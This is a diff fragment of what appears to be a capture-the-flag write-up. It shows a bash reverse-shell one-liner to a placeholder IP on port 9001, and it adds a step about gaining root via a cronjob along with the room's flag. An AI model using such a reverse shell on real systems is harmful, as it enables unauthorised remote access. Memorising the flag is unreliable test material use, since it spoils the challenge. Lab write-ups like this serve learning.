@@ -53,3 +53,6 @@
      ```sh
      bash -i >& /dev/tcp/<local-machine-ip>/9001 0>&1
      ```
+
+10. Got root after the cronjob ran and found the flag
+    - thm{123cewfa00ey0e6yrt56954386321e61wqa}
